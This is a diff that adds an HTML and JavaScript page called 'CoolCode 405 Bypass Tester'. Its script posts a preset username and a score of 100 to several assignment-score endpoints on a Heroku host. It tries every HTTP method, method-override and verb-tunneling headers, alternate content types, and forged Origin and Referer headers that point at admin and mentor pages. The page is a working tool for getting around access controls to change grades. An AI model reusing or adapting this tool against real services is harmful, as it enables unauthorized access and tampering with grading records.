@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CoolCode 405 Bypass Tester</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #00ff00;
+            margin: 20px;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        .header {
+            text-align: center;
+            border: 2px solid #00ff00;
+            padding: 20px;
+            margin-bottom: 20px;
+            background: rgba(0, 255, 0, 0.1);
+        }
+        .section {
+            border: 1px solid #00ff00;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+        }
+        input, button, select, textarea {
+            padding: 8px;
+            margin: 5px;
+            background: #000;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            font-family: 'Courier New', monospace;
+        }
+        button {
+            background: #00ff00;
+            color: #000;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover {
+            background: #00cc00;
+        }
+        .output {
+            background: #000;
+            padding: 10px;
+            border: 1px solid #333;
+            border-radius: 5px;
+            white-space: pre-wrap;
+            max-height: 300px;
+            overflow-y: auto;
+            font-size: 12px;
+        }
+        .success { color: #00ff00; }
+        .error { color: #ff4444; }
+        .warning { color: #ffaa00; }
+        .info { color: #4488ff; }
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔥 CoolCode 405 Bypass Tester 🔥</h1>
+            <p>Specifically designed to handle Method Not Allowed errors</p>
+        </div>
+
+        <div class="grid">
+            <div class="section">
+                <h3>🎯 Target Configuration</h3>
+                <div>
+                    <label>Username:</label><br>
+                    <input type="text" id="username" value="CX8de3ce71-3cbTY" style="width: 200px;">
+                </div>
+                <div>
+                    <label>Assignment ID:</label><br>
+                    <input type="number" id="assignmentId" value="1" min="1" max="50">
+                </div>
+                <div>
+                    <label>Score:</label><br>
+                    <input type="number" id="score" value="100" min="0" max="100">
+                </div>
+            </div>
+
+            <div class="section">
+                <h3>🔧 Test Configuration</h3>
+                <div>
+                    <label>Endpoint:</label><br>
+                    <select id="endpoint" style="width: 250px;">
+                        <option value="/api/api/assignment/score">/api/api/assignment/score</option>
+                        <option value="/api/assignment/score">/api/assignment/score</option>
+                        <option value="/assignment/score">/assignment/score</option>
+                        <option value="/api/score">/api/score</option>
+                        <option value="/score">/score</option>
+                    </select>
+                </div>
+                <div>
+                    <label>HTTP Method:</label><br>
+                    <select id="method">
+                        <option value="POST">POST</option>
+                        <option value="PUT">PUT</option>
+                        <option value="PATCH">PATCH</option>
+                        <option value="GET">GET</option>
+                    </select>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h3>🚀 Quick Tests</h3>
+            <button onclick="testAllMethods()">Test All HTTP Methods</button>
+            <button onclick="testAllEndpoints()">Test All Endpoints</button>
+            <button onclick="testMethodOverrides()">Test Method Overrides</button>
+            <button onclick="testFormData()">Test Form Data</button>
+            <button onclick="testQueryParams()">Test Query Parameters</button>
+            <button onclick="clearOutput()">Clear Output</button>
+        </div>
+
+        <div class="section">
+            <h3>🔧 Advanced Bypass Techniques</h3>
+            <button onclick="testXHTTPMethodOverride()">X-HTTP-Method-Override</button>
+            <button onclick="testContentTypeBypass()">Content-Type Bypass</button>
+            <button onclick="testOriginBypass()">Origin Header Bypass</button>
+            <button onclick="testFakeReferer()">Fake Referer</button>
+            <button onclick="testVerbTunneling()">HTTP Verb Tunneling</button>
+        </div>
+
+        <div class="section">
+            <h3>📋 Output</h3>
+            <div id="output" class="output">Ready for 405 bypass testing...\n\nTip: 405 Method Not Allowed usually means:\n1. Wrong HTTP method (try PUT, PATCH instead of POST)\n2. Endpoint exists but needs different method\n3. Method override headers needed\n4. Form data instead of JSON required\n\nStart testing! 🚀\n</div>
+        </div>
+    </div>
+
+    <script>
+        const BASE_URL = 'https://coolcode-hacker-34c5455cd908.herokuapp.com';
+        
+        function log(message, type = 'info') {
+            const output = document.getElementById('output');
+            const timestamp = new Date().toISOString().substr(11, 8);
+            const colors = {
+                'success': '✅',
+                'error': '❌',
+                'warning': '⚠️',
+                'info': 'ℹ️'
+            };
+            
+            const symbol = colors[type] || 'ℹ️';
+            output.textContent += `[${timestamp}] ${symbol} ${message}\n`;
+            output.scrollTop = output.scrollHeight;
+        }
+        
+        function clearOutput() {
+            document.getElementById('output').textContent = '';
+        }
+        
+        function getPayload() {
+            return {
+                username: document.getElementById('username').value,
+                assignmentId: parseInt(document.getElementById('assignmentId').value),
+                score: parseInt(document.getElementById('score').value)
+            };
+        }
+        
+        async function makeRequest(method, endpoint, options = {}) {
+            const url = BASE_URL + endpoint;
+            const payload = getPayload();
+            
+            const defaultOptions = {
+                method: method,
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json',
+                    'User-Agent': 'CoolCodeHacker/1.0',
+                    ...options.headers
+                },
+                ...options
+            };
+            
+            // Add body for methods that support it
+            if (['POST', 'PUT', 'PATCH'].includes(method) && !options.body && !options.data) {
+                defaultOptions.body = JSON.stringify(payload);
+            }
+            
+            try {
+                const response = await fetch(url, defaultOptions);
+                const responseText = await response.text();
+                
+                log(`${method} ${endpoint} -> ${response.status}`, response.ok ? 'success' : 'error');
+                
+                if (responseText) {
+                    const preview = responseText.length > 150 ? responseText.substr(0, 150) + '...' : responseText;
+                    log(`Response: ${preview}`, 'info');
+                }
+                
+                if (response.status === 200) {
+                    log('🎉 SUCCESS! This combination works!', 'success');
+                    return { success: true, response };
+                } else if (response.status === 405) {
+                    log('405 Method Not Allowed - trying alternatives...', 'warning');
+                } else if (response.status === 404) {
+                    log('404 Not Found - endpoint may not exist', 'warning');
+                } else if (response.status === 401) {
+                    log('401 Unauthorized - authentication required', 'warning');
+                } else if (response.status === 403) {
+                    log('403 Forbidden - access denied', 'warning');
+                }
+                
+                return { success: false, status: response.status, response: responseText };
+                
+            } catch (error) {
+                log(`Request failed: ${error.message}`, 'error');
+                return { success: false, error: error.message };
+            }
+        }
+        
+        async function testAllMethods() {
+            log('🔍 Testing all HTTP methods...', 'info');
+            const endpoint = document.getElementById('endpoint').value;
+            const methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'];
+            
+            for (const method of methods) {
+                await makeRequest(method, endpoint);
+                await new Promise(resolve => setTimeout(resolve, 200));
+            }
+            
+            log('Method testing complete!', 'info');
+        }
+        
+        async function testAllEndpoints() {
+            log('🎯 Testing all endpoint variations...', 'info');
+            const method = document.getElementById('method').value;
+            const endpoints = [
+                '/api/api/assignment/score',
+                '/api/assignment/score',
+                '/assignment/score',
+                '/api/score',
+                '/score',
+                '/api/assignments/score',
+                '/api/assignment/update',
+                '/api/api/assignment/update'
+            ];
+            
+            for (const endpoint of endpoints) {
+                await makeRequest(method, endpoint);
+                await new Promise(resolve => setTimeout(resolve, 200));
+            }
+            
+            log('Endpoint testing complete!', 'info');
+        }
+        
+        async function testMethodOverrides() {
+            log('🔧 Testing HTTP method override techniques...', 'info');
+            const endpoint = document.getElementById('endpoint').value;
+            
+            // Test X-HTTP-Method-Override
+            await makeRequest('GET', endpoint, {
+                headers: {
+                    'X-HTTP-Method-Override': 'POST'
+                }
+            });
+            
+            await makeRequest('POST', endpoint, {
+                headers: {
+                    'X-HTTP-Method-Override': 'PUT'
+                }
+            });
+            
+            // Test _method parameter
+            const payload = getPayload();
+            await makeRequest('POST', endpoint, {
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: `_method=PUT&username=${payload.username}&assignmentId=${payload.assignmentId}&score=${payload.score}`
+            });
+            
+            log('Method override testing complete!', 'info');
+        }
+        
+        async function testFormData() {
+            log('📝 Testing form data submission...', 'info');
+            const endpoint = document.getElementById('endpoint').value;
+            const payload = getPayload();
+            
+            const formData = new FormData();
+            formData.append('username', payload.username);
+            formData.append('assignmentId', payload.assignmentId);
+            formData.append('score', payload.score);
+            
+            await makeRequest('POST', endpoint, {
+                headers: {}, // Remove Content-Type to let browser set it
+                body: formData
+            });
+            
+            // Test URL encoded
+            const urlEncoded = new URLSearchParams();
+            urlEncoded.append('username', payload.username);
+            urlEncoded.append('assignmentId', payload.assignmentId);
+            urlEncoded.append('score', payload.score);
+            
+            await makeRequest('POST', endpoint, {
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: urlEncoded
+            });
+            
+            log('Form data testing complete!', 'info');
+        }
+        
+        async function testQueryParams() {
+            log('🔗 Testing query parameter submission...', 'info');
+            const endpoint = document.getElementById('endpoint').value;
+            const payload = getPayload();
+            
+            const queryString = `?username=${encodeURIComponent(payload.username)}&assignmentId=${payload.assignmentId}&score=${payload.score}`;
+            const fullEndpoint = endpoint + queryString;
+            
+            await makeRequest('GET', fullEndpoint);
+            await makeRequest('POST', fullEndpoint);
+            await makeRequest('PUT', fullEndpoint);
+            
+            log('Query parameter testing complete!', 'info');
+        }
+        
+        async function testXHTTPMethodOverride() {
+            log('🔧 Testing X-HTTP-Method-Override header...', 'info');
+            const endpoint = document.getElementById('endpoint').value;
+            
+            const overrides = ['POST', 'PUT', 'PATCH', 'DELETE'];
+            
+            for (const override of overrides) {
+                await makeRequest('GET', endpoint, {
+                    headers: {
+                        'X-HTTP-Method-Override': override
+                    }
+                });
+                
+                await makeRequest('POST', endpoint, {
+                    headers: {
+                        'X-HTTP-Method-Override': override
+                    }
+                });
+            }
+            
+            log('X-HTTP-Method-Override testing complete!', 'info');
+        }
+        
+        async function testContentTypeBypass() {
+            log('📄 Testing Content-Type bypass...', 'info');
+            const endpoint = document.getElementById('endpoint').value;
+            const payload = getPayload();
+            
+            const contentTypes = [
+                'application/json',
+                'application/x-www-form-urlencoded',
+                'multipart/form-data',
+                'text/plain',
+                'application/xml',
+                'text/xml'
+            ];
+            
+            for (const contentType of contentTypes) {
+                await makeRequest('POST', endpoint, {
+                    headers: {
+                        'Content-Type': contentType
+                    },
+                    body: contentType.includes('json') ? JSON.stringify(payload) : 
+                          contentType.includes('form-urlencoded') ? new URLSearchParams(payload) :
+                          JSON.stringify(payload)
+                });
+            }
+            
+            log('Content-Type bypass testing complete!', 'info');
+        }
+        
+        async function testOriginBypass() {
+            log('🌐 Testing Origin header bypass...', 'info');
+            const endpoint = document.getElementById('endpoint').value;
+            
+            const origins = [
+                BASE_URL,
+                'https://localhost',
+                'https://127.0.0.1',
+                'https://admin.coolcode-hacker-34c5455cd908.herokuapp.com',
+                'null',
+                ''
+            ];
+            
+            for (const origin of origins) {
+                await makeRequest('POST', endpoint, {
+                    headers: {
+                        'Origin': origin,
+                        'Referer': origin + '/admin/'
+                    }
+                });
+            }
+            
+            log('Origin bypass testing complete!', 'info');
+        }
+        
+        async function testFakeReferer() {
+            log('🔗 Testing fake referer bypass...', 'info');
+            const endpoint = document.getElementById('endpoint').value;
+            
+            const referers = [
+                BASE_URL + '/admin/',
+                BASE_URL + '/ui/admin',
+                BASE_URL + '/dashboard',
+                BASE_URL + '/mentor',
+                'https://admin.localhost/'
+            ];
+            
+            for (const referer of referers) {
+                await makeRequest('POST', endpoint, {
+                    headers: {
+                        'Referer': referer,
+                        'Origin': referer
+                    }
+                });
+            }
+            
+            log('Fake referer testing complete!', 'info');
+        }
+        
+        async function testVerbTunneling() {
+            log('🚇 Testing HTTP verb tunneling...', 'info');
+            const endpoint = document.getElementById('endpoint').value;
+            const payload = getPayload();
+            
+            // Method tunneling techniques
+            const tunnels = [
+                {
+                    method: 'POST',
+                    headers: { 'X-HTTP-Method': 'PUT' },
+                    body: JSON.stringify({...payload, _method: 'PUT'})
+                },
+                {
+                    method: 'GET',
+                    headers: { 'X-HTTP-Method-Override': 'POST' }
+                },
+                {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: `_method=PUT&data=${encodeURIComponent(JSON.stringify(payload))}`
+                }
+            ];
+            
+            for (const tunnel of tunnels) {
+                await makeRequest(tunnel.method, endpoint, tunnel);
+            }
+            
+            log('HTTP verb tunneling testing complete!', 'info');
+        }
+        
+        // Initialize
+        log('CoolCode 405 Bypass Tester initialized! 🚀', 'success');
+        log('This tool tests various methods to bypass 405 Method Not Allowed errors.', 'info');
+    </script>
+</body>
+</html>
